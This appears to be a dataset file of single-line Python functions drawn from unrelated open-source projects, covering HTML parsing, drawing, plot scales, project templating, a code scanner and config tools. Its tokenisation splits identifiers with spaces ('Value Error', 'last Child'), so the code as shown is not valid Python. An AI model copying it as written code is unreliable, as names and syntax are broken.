def extract ( self ) : if self . parent : try : self . parent . contents . remove ( self ) except Value Error : pass #Find the two elements that would be next to each other if #this element (and any children) hadn't been parsed. Connect #the two. last Child = self . last Recursive Child ( ) next Element = last Child . next if self . previous : self . previous . next = next Element if next Element : next Element . previous = self . previous self . previous = None last Child . next = None self . parent = None if self . previous Sibling : self . previous Sibling . next Sibling = self . next Sibling if self . next Sibling : self . next Sibling . previous Sibling = self . previous Sibling self . previous Sibling = self . next Sibling = None return self
def last Recursive Child ( self ) : last Child = self while hasattr ( last Child , 'contents' ) and last Child . contents : last Child = last Child . contents [ - 1 ] return last Child
def find All ( self , name , attrs , text , limit , generator , * * kwargs ) : if isinstance ( name , Soup Strainer ) : strainer = name else : # Build a Soup Strainer strainer = Soup Strainer ( name , attrs , text , * * kwargs ) results = Result Set ( strainer ) g = generator ( ) while True : try : i = g . next ( ) except Stop Iteration : break if i : found = strainer . search ( i ) if found : results . append ( found ) if limit and len ( results ) >= limit : break return results
def invert ( h ) : i = { } for k , v in h . items ( ) : i [ v ] = k return i
def decompose ( self ) : contents = [ i for i in self . contents ] for i in contents : if isinstance ( i , Tag ) : i . decompose ( ) else : i . extract ( ) self . extract ( )
def convert charref ( self , name ) : try : n = int ( name ) except Value Error : return if not 0 <= n <= 127 : # ASCII ends at 127, not 255 return return self . convert codepoint ( n )
def handle charref ( self , ref ) : if self . convert Entities : data = unichr ( int ( ref ) ) else : data = '&#%s;' % ref self . handle data ( data )
def detect Encoding ( self , xml data , is HTML = False ) : xml encoding = sniffed xml encoding = None try : if xml data [ : 4 ] == '\x4c\x6f\xa7\x94' : # EBCDIC xml data = self . ebcdic to ascii ( xml data ) elif xml data [ : 4 ] == '\x00\x3c\x00\x3f' : # UTF-16BE sniffed xml encoding = 'utf-16be' xml data = unicode ( xml data , 'utf-16be' ) . encode ( 'utf-8' ) elif ( len ( xml data ) >= 4 ) and ( xml data [ : 2 ] == '\xfe\xff' ) and ( xml data [ 2 : 4 ] != '\x00\x00' ) : # UTF-16BE with BOM sniffed xml encoding = 'utf-16be' xml data = unicode ( xml data [ 2 : ] , 'utf-16be' ) . encode ( 'utf-8' ) elif xml data [ : 4 ] == '\x3c\x00\x3f\x00' : # UTF-16LE sniffed xml encoding = 'utf-16le' xml data = unicode ( xml data , 'utf-16le' ) . encode ( 'utf-8' ) elif ( len ( xml data ) >= 4 ) and ( xml data [ : 2 ] == '\xff\xfe' ) and ( xml data [ 2 : 4 ] != '\x00\x00' ) : # UTF-16LE with BOM sniffed xml encoding = 'utf-16le' xml data = unicode ( xml data [ 2 : ] , 'utf-16le' ) . encode ( 'utf-8' ) elif xml data [ : 4 ] == '\x00\x00\x00\x3c' : # UTF-32BE sniffed xml encoding = 'utf-32be' xml data = unicode ( xml data , 'utf-32be' ) . encode ( 'utf-8' ) elif xml data [ : 4 ] == '\x3c\x00\x00\x00' : # UTF-32LE sniffed xml encoding = 'utf-32le' xml data = unicode ( xml data , 'utf-32le' ) . encode ( 'utf-8' ) elif xml data [ : 4 ] == '\x00\x00\xfe\xff' : # UTF-32BE with BOM sniffed xml encoding = 'utf-32be' xml data = unicode ( xml data [ 4 : ] , 'utf-32be' ) . encode ( 'utf-8' ) elif xml data [ : 4 ] == '\xff\xfe\x00\x00' : # UTF-32LE with BOM sniffed xml encoding = 'utf-32le' xml data = unicode ( xml data [ 4 : ] , 'utf-32le' ) . encode ( 'utf-8' ) elif xml data [ : 3 ] == '\xef\xbb\xbf' : # UTF-8 with BOM sniffed xml encoding = 'utf-8' xml data = unicode ( xml data [ 3 : ] , 'utf-8' ) . encode ( 'utf-8' ) else : sniffed xml encoding = 'ascii' pass except : xml encoding match = None xml encoding match = re . compile ( '^<\?.*encoding=[\'"](.*?)[\'"].*\?>' ) . match ( xml data ) if not xml encoding match and is HTML : regexp = re . compile ( '<\s*meta[^>]+charset=([^>]*?)[;\'">]' , re . I ) xml encoding match = regexp . search ( xml data ) if xml encoding match is not None : xml encoding = xml encoding match . groups ( ) [ 0 ] . lower ( ) if is HTML : self . declared HTML Encoding = xml encoding if sniffed xml encoding and ( xml encoding in ( 'iso-10646-ucs-2' , 'ucs-2' , 'csunicode' , 'iso-10646-ucs-4' , 'ucs-4' , 'csucs4' , 'utf-16' , 'utf-32' , 'utf 16' , 'utf 32' , 'utf16' , 'u16' ) ) : xml encoding = sniffed xml encoding return xml data , xml encoding , sniffed xml encoding
def shoebot example ( * * shoebot kwargs ) : def decorator ( f ) : def run ( ) : from shoebot import Shoebot Install Error print ( "    Shoebot - %s:" % f . name . replace ( " " , " " ) ) try : import shoebot outputfile = "/tmp/shoebot-%s.png" % f . name bot = shoebot . create bot ( outputfile = outputfile ) f ( bot ) bot . finish ( ) print ( '        [passed] : %s' % outputfile ) print ( '' ) except Shoebot Install Error as e : print ( '        [failed]' , e . args [ 0 ] ) print ( '' ) except Exception : print ( '        [failed] - traceback:' ) for line in traceback . format exc ( ) . splitlines ( ) : print ( '    %s' % line ) print ( '' ) return run return decorator
def get center ( self ) : x = ( self . x + self . width / 2 ) y = ( self . y + self . height / 2 ) return ( x , y )
def scale context and center ( self , cr ) : bot width , bot height = self . bot size if self . width != bot width or self . height != bot height : # Scale up by largest dimension if self . width < self . height : scale x = float ( self . width ) / float ( bot width ) scale y = scale x cr . translate ( 0 , ( self . height - ( bot height * scale y ) ) / 2.0 ) elif self . width > self . height : scale y = float ( self . height ) / float ( bot height ) scale x = scale y cr . translate ( ( self . width - ( bot width * scale x ) ) / 2.0 , 0 ) else : scale x = 1.0 scale y = 1.0 cr . scale ( scale x , scale y ) self . input device . scale x = scale y self . input device . scale y = scale y
def draw ( self , widget , cr ) : if self . bot size is None : # No bot to draw yet. self . draw default image ( cr ) return cr = driver . ensure pycairo context ( cr ) surface = self . backing store . surface cr . set source surface ( surface ) cr . paint ( )
def create rcontext ( self , size , frame ) : if self . format == 'pdf' : surface = cairo . PDF Surface ( self . output file ( frame ) , * size ) elif self . format in ( 'ps' , 'eps' ) : surface = cairo . PS Surface ( self . output file ( frame ) , * size ) elif self . format == 'svg' : surface = cairo . SVG Surface ( self . output file ( frame ) , * size ) elif self . format == 'surface' : surface = self . target else : surface = cairo . Image Surface ( cairo . FORMAT ARGB32 , * size ) return cairo . Context ( surface )
def rendering finished ( self , size , frame , cairo ctx ) : surface = cairo ctx . get target ( ) if self . format == 'png' : surface . write to png ( self . output file ( frame ) ) surface . finish ( ) surface . flush ( )
def parse ( self ) : p1 = "\[.*?\](.*?)\[\/.*?\]" p2 = "\[(.*?)\]" self . links = [ ] for p in ( p1 , p2 ) : for link in re . findall ( p , self . description ) : self . links . append ( link ) self . description = re . sub ( p , "\\1" , self . description ) self . description = self . description . strip ( )
def save as ( self ) : chooser = Shoebot File Chooser Dialog ( ( 'Save File' ) , None , Gtk . File Chooser Action . SAVE , ( Gtk . STOCK SAVE , Gtk . Response Type . ACCEPT , Gtk . STOCK CANCEL , Gtk . Response Type . CANCEL ) ) chooser . set do overwrite confirmation ( True ) chooser . set transient for ( self ) saved = chooser . run ( ) == Gtk . Response Type . ACCEPT if saved : old filename = self . filename self . source buffer . filename = chooser . get filename ( ) if not self . save ( ) : self . filename = old filename chooser . destroy ( ) return saved
def widget changed ( self , widget , v ) : # set the appropriate bot var if v . type is NUMBER : self . bot . namespace [ v . name ] = widget . get value ( ) self . bot . vars [ v . name ] . value = widget . get value ( ) ## Not sure if this is how to do this - stu publish event ( VARIABLE UPDATED EVENT , v ) # pretty dumb for now elif v . type is BOOLEAN : self . bot . namespace [ v . name ] = widget . get active ( ) self . bot . vars [ v . name ] . value = widget . get active ( ) ## Not sure if this is how to do this - stu publish event ( VARIABLE UPDATED EVENT , v ) # pretty dumb for now elif v . type is TEXT : self . bot . namespace [ v . name ] = widget . get text ( ) self . bot . vars [ v . name ] . value = widget . get text ( ) ## Not sure if this is how to do this - stu publish event ( VARIABLE UPDATED EVENT , v )
def parse ( svg , cached = False , copy = True ) : if not cached : dom = parser . parse String ( svg ) paths = parse node ( dom , [ ] ) else : id = cache . id ( svg ) if not cache . has key ( id ) : dom = parser . parse String ( svg ) cache . save ( id , parse node ( dom , [ ] ) ) paths = cache . load ( id , copy ) return paths
def get attribute ( element , attribute , default = 0 ) : a = element . get Attribute ( attribute ) if a == "" : return default return a
def copy ( self , graph ) : e = events ( graph , self . ctx ) e . clicked = self . clicked return e
def drag ( self , node ) : dx = self . mouse . x - self . graph . x dy = self . mouse . y - self . graph . y # A dashed line indicates the drag vector. s = self . graph . styles . default self . ctx . nofill ( ) self . ctx . nostroke ( ) if s . stroke : self . ctx . strokewidth ( s . strokewidth ) self . ctx . stroke ( s . stroke . r , s . stroke . g , s . stroke . g , 0.75 ) p = self . ctx . line ( node . x , node . y , dx , dy , draw = False ) try : p . ns Bezier Path . set Line Dash count phase ( [ 2 , 4 ] , 2 , 50 ) except : pass self . ctx . drawpath ( p ) r = node . class ( None ) . r * 0.75 self . ctx . oval ( dx - r / 2 , dy - r / 2 , r , r ) node . vx = dx / self . graph . d node . vy = dy / self . graph . d
def hover ( self , node ) : if self . popup == False : return if self . popup == True or self . popup . node != node : if self . popup text . has key ( node . id ) : texts = self . popup text [ node . id ] else : texts = None self . popup = popup ( self . ctx , node , texts ) self . popup . draw ( )
def textpath ( self , i ) : if len ( self . textpaths ) == i : self . ctx . font ( self . font , self . fontsize ) txt = self . q [ i ] if len ( self . q ) > 1 : # Indicate current text (e.g. 5/13). txt += " (" + str ( i + 1 ) + "/" + str ( len ( self . q ) ) + ")" p = self . ctx . textpath ( txt , 0 , 0 , width = self . w ) h = self . ctx . textheight ( txt , width = self . w ) self . textpaths . append ( ( p , h ) ) return self . textpaths [ i ]
def update ( self ) : if self . delay > 0 : # It takes a while for the popup to appear. self . delay -= 1 return if self . fi == 0 : # Only one text in queue, displayed infinitely. if len ( self . q ) == 1 : self . fn = float ( "inf" ) # Else, display time depends on text length. else : self . fn = len ( self . q [ self . i ] ) / self . speed self . fn = max ( self . fn , self . mf ) self . fi += 1 if self . fi > self . fn : # Rotate to the next text in queue. self . fi = 0 self . i = ( self . i + 1 ) % len ( self . q )
def draw ( self ) : if len ( self . q ) > 0 : self . update ( ) if self . delay == 0 : # Rounded rectangle in the given background color. p , h = self . textpath ( self . i ) f = self . fontsize self . ctx . fill ( self . background ) self . ctx . rect ( self . node . x + f * 1.0 , self . node . y + f * 0.5 , self . w + f , h + f * 1.5 , roundness = 0.2 ) # Fade in/out the current text. alpha = 1.0 if self . fi < 5 : alpha = 0.2 * self . fi if self . fn - self . fi < 5 : alpha = 0.2 * ( self . fn - self . fi ) self . ctx . fill ( self . text . r , self . text . g , self . text . b , self . text . a * alpha ) self . ctx . translate ( self . node . x + f * 2.0 , self . node . y + f * 2.5 ) self . ctx . drawpath ( p )
def merge configs ( main , tweaks ) : for section in tweaks . sections ( ) : for option in tweaks . options ( section ) : value = tweaks . get ( section , option ) if option . endswith ( "+" ) : option = option [ : - 1 ] value = main . get ( section , option ) + value main . set ( section , option , value )
def usable class name ( node ) : name = node . qname ( ) for prefix in [ " builtin ." , "builtins." , "." ] : if name . startswith ( prefix ) : name = name [ len ( prefix ) : ] return name
def parse pylint output ( pylint output ) : for line in pylint output : if not line . strip ( ) : continue if line [ 0 : 5 ] in ( "-" * 5 , "*" * 5 ) : continue parsed = PYLINT PARSEABLE REGEX . search ( line ) if parsed is None : LOG . warning ( u"Unable to parse %r. If this is a lint failure, please re-run pylint with the " u"--output-format=parseable option, otherwise, you can ignore this message." , line ) continue parsed dict = parsed . groupdict ( ) parsed dict [ 'linenum' ] = int ( parsed dict [ 'linenum' ] ) yield Pylint Error ( * * parsed dict )
def fix pylint ( line , errors ) : if not errors : yield line return current = PYLINT EXCEPTION REGEX . search ( line ) if current : original errors = { disable . strip ( ) for disable in current . group ( 'disables' ) . split ( ',' ) } else : original errors = set ( ) disabled errors = set ( original errors ) for error in errors : if error . error name == 'useless-suppression' : parsed = re . search ( """Useless suppression of '(?P<error name>[^']+)'""" , error . error msg ) disabled errors . discard ( parsed . group ( 'error name' ) ) elif error . error name == 'missing-docstring' and error . error msg == 'Missing module docstring' : yield format pylint disables ( { error . error name } ) . strip ( ) + '\n' else : disabled errors . add ( error . error name ) disable string = format pylint disables ( disabled errors , not disabled errors <= original errors ) if current : yield PYLINT EXCEPTION REGEX . sub ( disable string , line ) else : yield re . sub ( r'($\s*)' , disable string + r'\1' , line , count = 1 )
def main ( argv = None ) : if argv is None : argv = sys . argv [ 1 : ] if not argv or argv [ 0 ] == "help" : show help ( ) return 0 elif argv [ 0 ] == "check" : return check main ( argv [ 1 : ] ) elif argv [ 0 ] == "list" : return list main ( argv [ 1 : ] ) elif argv [ 0 ] == "write" : return write main ( argv [ 1 : ] ) else : print ( u"Don't understand {!r}" . format ( " " . join ( argv ) ) ) show help ( ) return 1
def show help ( ) : print ( ) for cmd in [ write main , check main , list main ] : print ( cmd . doc . lstrip ( "\n" ) )
def transform ( x ) : try : x = date2num ( x ) except Attribute Error : # numpy datetime64 # This is not ideal because the operations do not # preserve the np.datetime64 type. May be need # a datetime64 trans x = [ pd . Timestamp ( item ) for item in x ] x = date2num ( x ) return x
def transform ( x ) : # microseconds try : x = np . array ( [ x . total seconds ( ) * 10 ** 6 for x in x ] ) except Type Error : x = x . total seconds ( ) * 10 ** 6 return x
def inverse ( x ) : try : x = [ datetime . timedelta ( microseconds = i ) for i in x ] except Type Error : x = datetime . timedelta ( microseconds = x ) return x
def transform ( x ) : # nanoseconds try : x = np . array ( [ x . value for x in x ] ) except Type Error : x = x . value return x
def inverse ( x ) : try : x = [ pd . Timedelta ( int ( i ) ) for i in x ] except Type Error : x = pd . Timedelta ( int ( x ) ) return x
def censor with ( x , range , value = None ) : return [ val if range [ 0 ] <= val <= range [ 1 ] else value for val in x ]
def best units ( self , sequence ) : # Read #   [(0.9, 's'), #    (9, 'm)] # as, break ranges between 0.9 seconds (inclusive) # and 9 minutes are represented in seconds. And so on. ts range = self . value ( max ( sequence ) ) - self . value ( min ( sequence ) ) package = self . determine package ( sequence [ 0 ] ) if package == 'pandas' : cuts = [ ( 0.9 , 'us' ) , ( 0.9 , 'ms' ) , ( 0.9 , 's' ) , ( 9 , 'm' ) , ( 6 , 'h' ) , ( 4 , 'd' ) , ( 4 , 'w' ) , ( 4 , 'M' ) , ( 3 , 'y' ) ] denomination = NANOSECONDS base units = 'ns' else : cuts = [ ( 0.9 , 's' ) , ( 9 , 'm' ) , ( 6 , 'h' ) , ( 4 , 'd' ) , ( 4 , 'w' ) , ( 4 , 'M' ) , ( 3 , 'y' ) ] denomination = SECONDS base units = 'ms' for size , units in reversed ( cuts ) : if ts range >= size * denomination [ units ] : return units return base units
def scaled limits ( self ) : min = self . limits [ 0 ] / self . factor max = self . limits [ 1 ] / self . factor return min , max
def numeric to timedelta ( self , numerics ) : if self . package == 'pandas' : return [ self . type ( int ( x * self . factor ) , units = 'ns' ) for x in numerics ] else : return [ self . type ( seconds = x * self . factor ) for x in numerics ]
def round any ( x , accuracy , f = np . round ) : if not hasattr ( x , 'dtype' ) : x = np . asarray ( x ) return f ( x / accuracy ) * accuracy
def nearest int ( x ) : if x == 0 : return np . int64 ( 0 ) elif x > 0 : return np . int64 ( x + 0.5 ) else : return np . int64 ( x - 0.5 )
def format ( formatter , x ) : # For MPL to play nice formatter . create dummy axis ( ) # For sensible decimal places formatter . set locs ( [ val for val in x if ~ np . isnan ( val ) ] ) try : oom = int ( formatter . order Of Magnitude ) except Attribute Error : oom = 0 labels = [ formatter ( tick ) for tick in x ] # Remove unnecessary decimals pattern = re . compile ( r'\.0+$' ) for i , label in enumerate ( labels ) : match = pattern . search ( label ) if match : labels [ i ] = pattern . sub ( '' , label ) # MPL does not add the exponential component if oom : labels = [ '{}e{}' . format ( s , oom ) if s != '0' else s for s in labels ] return labels
def switch ( template , version ) : temple . update . update ( new template = template , new version = version )
def in git repo ( ) : ret = temple . utils . shell ( 'git rev-parse' , stderr = subprocess . DEVNULL , check = False ) return ret . returncode == 0
def has branch ( branch ) : ret = temple . utils . shell ( 'git rev-parse --verify {}' . format ( branch ) , stderr = subprocess . DEVNULL , stdout = subprocess . DEVNULL , check = False ) return ret . returncode == 0
def not has branch ( branch ) : if has branch ( branch ) : msg = 'Cannot proceed while {} branch exists; remove and try again.' . format ( branch ) raise temple . exceptions . Existing Branch Error ( msg )
def has env vars ( * env vars ) : for env var in env vars : if not os . environ . get ( env var ) : msg = ( 'Must set {} environment variable. View docs for setting up environment at {}' ) . format ( env var , temple . constants . TEMPLE DOCS URL ) raise temple . exceptions . Invalid Environment Error ( msg )
def is temple project ( ) : if not os . path . exists ( temple . constants . TEMPLE CONFIG FILE ) : msg = 'No {} file found in repository.' . format ( temple . constants . TEMPLE CONFIG FILE ) raise temple . exceptions . Invalid Temple Project Error ( msg )
def get current branch ( ) : result = temple . utils . shell ( 'git rev-parse --abbrev-ref HEAD' , stdout = subprocess . PIPE ) return result . stdout . decode ( 'utf8' ) . strip ( )
def apply template ( template , target , * , checkout , extra context ) : with tempfile . Temporary Directory ( ) as tempdir : repo dir = cc main . cookiecutter ( template , checkout = checkout , no input = True , output dir = tempdir , extra context = extra context ) for item in os . listdir ( repo dir ) : src = os . path . join ( repo dir , item ) dst = os . path . join ( target , item ) if os . path . isdir ( src ) : if os . path . exists ( dst ) : shutil . rmtree ( dst ) shutil . copytree ( src , dst ) else : if os . path . exists ( dst ) : os . remove ( dst ) shutil . copy2 ( src , dst )
def shell ( cmd , check = True , stdin = None , stdout = None , stderr = None ) : return subprocess . run ( cmd , shell = True , check = check , stdin = stdin , stdout = stdout , stderr = stderr )
def read temple config ( ) : with open ( temple . constants . TEMPLE CONFIG FILE ) as temple config file : return yaml . load ( temple config file , Loader = yaml . Safe Loader )
def write temple config ( temple config , template , version ) : with open ( temple . constants . TEMPLE CONFIG FILE , 'w' ) as temple config file : versioned config = { * * temple config , * * { ' version' : version , ' template' : template } , } yaml . dump ( versioned config , temple config file , Dumper = yaml . Safe Dumper )
def set cmd env var ( value ) : def func decorator ( function ) : @ functools . wraps ( function ) def wrapper ( * args , * * kwargs ) : previous cmd env var = os . getenv ( temple . constants . TEMPLE ENV VAR ) os . environ [ temple . constants . TEMPLE ENV VAR ] = value try : ret val = function ( * args , * * kwargs ) finally : if previous cmd env var is None : del os . environ [ temple . constants . TEMPLE ENV VAR ] else : os . environ [ temple . constants . TEMPLE ENV VAR ] = previous cmd env var return ret val return wrapper return func decorator
def run ( self ) : filename = ".DS Store" command = "find {path} -type f -name \"{filename}\" " . format ( path = self . path , filename = filename ) cmd = Command Helper ( command ) cmd . execute ( ) files = cmd . output . split ( "\n" ) for f in files : if not f . endswith ( filename ) : continue # Ignore paths excluded rel path = f . replace ( self . path , "" ) if rel path . startswith ( tuple ( self . CONFIG [ 'exclude paths' ] ) ) : continue issue = Issue ( ) issue . name = "File .DS Store detected" issue . potential = False issue . severity = Issue . SEVERITY LOW # Get only relative path issue . file = rel path self . save Issue ( issue )
def setup ( ) : # # Check if dir is writable # if not os.access(Atom Shields Scanner.HOME, os.W OK): # 	Atom Shields Scanner.HOME = os.path.expanduser("~/.atomshields") # 	Atom Shields Scanner.CHECKERS DIR = os.path.join(Atom Shields Scanner.HOME, "checkers") # 	Atom Shields Scanner.REPORTS DIR = os.path.join(Atom Shields Scanner.HOME, "reports") if not os . path . isdir ( Atom Shields Scanner . CHECKERS DIR ) : os . makedirs ( Atom Shields Scanner . CHECKERS DIR ) if not os . path . isdir ( Atom Shields Scanner . REPORTS DIR ) : os . makedirs ( Atom Shields Scanner . REPORTS DIR ) # Copy all checkers for f in Atom Shields Scanner . get Files ( os . path . join ( os . path . dirname ( os . path . realpath ( file ) ) , "checkers" ) , "*.py" ) : Atom Shields Scanner . install Checker ( f ) # Copy all reports for f in Atom Shields Scanner . get Files ( os . path . join ( os . path . dirname ( os . path . realpath ( file ) ) , "reports" ) , "*.py" ) : Atom Shields Scanner . install Report ( f ) Atom Shields Scanner . execute Massive Method ( path = Atom Shields Scanner . CHECKERS DIR , method = "install" , args = { } ) config dir = os . path . dirname ( Atom Shields Scanner . CONFIG PATH ) if not os . path . isdir ( config dir ) : os . makedirs ( config dir )
def run ( self ) : self . check Properties ( ) self . debug ( "[*] Iniciando escaneo de Atom Shields con las siguientes propiedades. . . " ) self . show Scan Properties ( ) self . load Config ( ) # Init time counter init ts = datetime . now ( ) # Execute plugins cwd = os . getcwd ( ) os . chdir ( self . path ) issues = self . execute Checkers ( ) os . chdir ( cwd ) # Finish time counter end ts = datetime . now ( ) duration = '{}' . format ( end ts - init ts ) # Process and set issues for plugin in issues . keys ( ) : value = issues [ plugin ] if isinstance ( value , list ) : map ( self . save Issue , value ) else : self . save Issue ( value ) # Execute reports print "" self . execute Reports ( ) # Print summary output. self . debug ( "" ) self . debug ( "Duration: {t}" . format ( t = duration ) ) self . show Summary ( ) return self . issues
def install ( ) : cmd = Command Helper ( ) cmd . install ( "npm" ) cmd = Command Helper ( ) cmd . install ( "nodejs-legacy" ) # Install retre with npm cmd = Command Helper ( ) cmd . command = "npm install -g retire" cmd . execute ( ) if cmd . errors : from termcolor import colored print colored ( cmd . errors , "red" ) else : print cmd . output
def load ( self , prefix = None , depth = None ) : prefix = prefix or self . prefix prefix = '/' + prefix . strip ( '/' ) + '/' if depth is None : depth = self . inherit depth if not self . configured : log . debug ( "etcd not available" ) return if self . watching : log . info ( "Starting watcher for %r" , prefix ) self . start watching ( ) log . info ( "Loading from etcd %r" , prefix ) try : result = self . client . get ( prefix ) except self . module . Etcd Key Not Found : result = None if not result : log . info ( "No configuration found" ) return { } # Iterate over the returned keys from etcd update = { } for item in result . children : key = item . key value = item . value # Try to parse them as JSON strings, just in case it works try : value = pytool . json . from json ( value ) except : pass # Make the key lower-case if we're not case-sensitive if not self . case sensitive : key = key . lower ( ) # Strip off the prefix that we're using if key . startswith ( prefix ) : key = key [ len ( prefix ) : ] # Store the key/value to update the config update [ key ] = value # Access cached settings directly to avoid recursion inherited = Config ( ) . settings . get ( self . inherit key , update . get ( self . inherit key , None ) ) if depth > 0 and inherited : log . info ( "    ... inheriting ..." ) inherited = self . load ( inherited , depth - 1 ) or { } inherited . update ( update ) update = inherited return update
def get watcher ( self ) : if not self . watching : raise Stop Iteration ( ) return self . client . eternal watch ( self . prefix , recursive = True )
def start watching ( self ) : # Don't create a new watcher thread if we already have one running if self . watcher and self . watcher . is alive ( ) : return # Create a new watcher thread and start it self . watcher = Watcher ( ) self . watcher . start ( )
def main ( ) : parser = argparse . Argument Parser ( description = "Helper for working with " "pyconfigs" ) target group = parser . add mutually exclusive group ( ) target group . add argument ( '-f' , '--filename' , help = "parse an individual file or directory" , metavar = 'F' ) target group . add argument ( '-m' , '--module' , help = "parse a package or module, recursively looking inside it" , metavar = 'M' ) parser . add argument ( '-v' , '--view-call' , help = "show the actual pyconfig call made (default: show namespace)" , action = 'store true' ) parser . add argument ( '-l' , '--load-configs' , help = "query the currently set value for each key found" , action = 'store true' ) key group = parser . add mutually exclusive group ( ) key group . add argument ( '-a' , '--all' , help = "show keys which don't have defaults set" , action = 'store true' ) key group . add argument ( '-k' , '--only-keys' , help = "show a list of discovered keys without values" , action = 'store true' ) parser . add argument ( '-n' , '--natural-sort' , help = "sort by filename and line (default: alphabetical by key)" , action = 'store true' ) parser . add argument ( '-s' , '--source' , help = "show source annotations (implies --natural-sort)" , action = 'store true' ) parser . add argument ( '-c' , '--color' , help = "toggle output colors (default: %s)" % bool ( pygments ) , action = 'store const' , default = bool ( pygments ) , const = ( not bool ( pygments ) ) ) args = parser . parse args ( ) if args . color and not pygments : error ( "Pygments is required for color output.\n" "    pip install pygments" ) if args . module : handle module ( args ) if args . filename : handle file ( args )
def handle module ( args ) : module = get module filename ( args . module ) if not module : error ( "Could not load module or package: %r" , args . module ) elif isinstance ( module , Unparseable ) : error ( "Could not determine module source: %r" , args . module ) parse and output ( module , args )
def colorize ( output ) : if not pygments : return output # Available styles # ['monokai', 'manni', 'rrt', 'perldoc', 'borland', 'colorful', 'default', # 'murphy', 'vs', 'trac', 'tango', 'fruity', 'autumn', 'bw', 'emacs', # 'vim', 'pastie', 'friendly', 'native'] return pygments . highlight ( output , pygments . lexers . Python Lexer ( ) , pygments . formatters . Terminal256Formatter ( style = 'monokai' ) )
def map arg ( arg ) : # Grab the easy to parse values if isinstance ( arg , ast . Str ) : return repr ( arg . s ) elif isinstance ( arg , ast . Num ) : return arg . n elif isinstance ( arg , ast . Name ) : name = arg . id if name == 'True' : return True elif name == 'False' : return False elif name == 'None' : return None return name else : # Everything else we don't bother with return Unparseable ( )
def as call ( self ) : default = self . default ( ) default = ', ' + default if default else '' return "pyconfig.%s(%r%s)" % ( self . method , self . get key ( ) , default )
def get key ( self ) : if not isinstance ( self . key , Unparseable ) : return self . key line = self . source [ self . col offset : ] regex = re . compile ( '''pyconfig\.[eginst]+\(([^,]+).*?\)''' ) match = regex . match ( line ) if not match : return Unparseable ( ) return "<%s>" % match . group ( 1 )
def default value only ( self ) : line = self . source [ self . col offset : ] regex = re . compile ( '''pyconfig\.[eginst]+\(['"][^)]+?['"], ?(.*?)\)''' ) match = regex . match ( line ) if not match : return '' return match . group ( 1 )
def default ( self ) : try : # Check if it's iterable iter ( self . default ) except Type Error : return repr ( self . default ) # This is to look for unparsable values, and if we find one, we try to # directly parse the string for v in self . default : if isinstance ( v , Unparseable ) : default = self . default value only ( ) if default : return default # Otherwise just make it a string and go return ', ' . join ( str ( v ) for v in self . default )
def get param names ( self ) : template = Template ( self . yaml string ) names = [ 'yaml string' ] # always include the template for match in re . finditer ( template . pattern , template . template ) : name = match . group ( 'named' ) or match . group ( 'braced' ) assert name is not None names . append ( name ) return names
def load ( self ) : from pylearn2 . config import yaml parse from pylearn2 . datasets import Dataset dataset = yaml parse . load ( self . yaml string ) assert isinstance ( dataset , Dataset ) data = dataset . iterator ( mode = 'sequential' , num batches = 1 , data specs = dataset . data specs , return tuple = True ) . next ( ) if len ( data ) == 2 : X , y = data y = np . squeeze ( y ) if self . one hot : y = np . argmax ( y , axis = 1 ) else : X = data y = None return X , y
def create kernel ( self ) : # Check kernels kernels = self . kernel params if not isinstance ( kernels , list ) : raise Runtime Error ( 'Must provide enumeration of kernels' ) for kernel in kernels : if sorted ( list ( kernel . keys ( ) ) ) != [ 'name' , 'options' , 'params' ] : raise Runtime Error ( 'strategy/params/kernels must contain keys: "name", "options", "params"' ) # Turn into entry points. # TODO use eval to allow user to specify internal variables for kernels (e.g. V) in config file. kernels = [ ] for kern in self . kernel params : params = kern [ 'params' ] options = kern [ 'options' ] name = kern [ 'name' ] kernel ep = load entry point ( name , 'strategy/params/kernels' ) if issubclass ( kernel ep , KERNEL BASE CLASS ) : if options [ 'independent' ] : # TODO Catch errors here?  Estimator entry points don't catch instantiation errors kernel = np . sum ( [ kernel ep ( 1 , active dims = [ i ] , * * params ) for i in range ( self . n dims ) ] ) else : kernel = kernel ep ( self . n dims , * * params ) if not isinstance ( kernel , KERNEL BASE CLASS ) : raise Runtime Error ( 'strategy/params/kernel must load a' 'G Py derived Kernel' ) kernels . append ( kernel ) self . kernel = np . sum ( kernels )
def assert all finite ( X ) : X = np . asanyarray ( X ) # First try an O(n) time, O(1) space solution for the common case that # everything is finite; fall back to O(n) space np.isfinite to prevent # false positives from overflow in sum method if ( X . dtype . char in np . typecodes [ 'All Float' ] and not np . isfinite ( X . sum ( ) ) and not np . isfinite ( X ) . all ( ) ) : raise Value Error ( "Input contains Na N, infinity" " or a value too large for %r." % X . dtype )
def warn if not finite ( X ) : X = np . asanyarray ( X ) # First try an O(n) time, O(1) space solution for the common case that # everything is finite; fall back to O(n) space np.isfinite to prevent # false positives from overflow in sum method if ( X . dtype . char in np . typecodes [ 'All Float' ] and not np . isfinite ( X . sum ( ) ) and not np . isfinite ( X ) . all ( ) ) : warnings . warn ( "Result contains Na N, infinity" " or a value too large for %r." % X . dtype , category = User Warning )
def num samples ( x , is nested = False ) : if hasattr ( x , 'fit' ) : # Don't get num samples from an ensembles length! raise Type Error ( 'Expected sequence or array-like, got ' 'estimator %s' % x ) if is nested : return sum ( num samples ( xx , is nested = False ) for xx in x ) if not hasattr ( x , ' len ' ) and not hasattr ( x , 'shape' ) : if hasattr ( x , ' array ' ) : x = np . asarray ( x ) else : raise Type Error ( "Expected sequence or array-like, got %s" % type ( x ) ) if hasattr ( x , 'shape' ) : if len ( x . shape ) == 0 : raise Type Error ( "Singleton array %r cannot be considered" " a valid collection." % x ) return x . shape [ 0 ] else : return len ( x )
def fromdict ( cls , config , check fields = True ) : m = super ( Config , cls ) . new ( cls ) m . path = '.' m . verbose = False m . config = m . merge defaults ( config ) if check fields : m . check fields ( ) return m
def sha1 ( self ) : with open ( self . path , 'rb' ) as f : return hashlib . sha1 ( f . read ( ) ) . hexdigest ( )
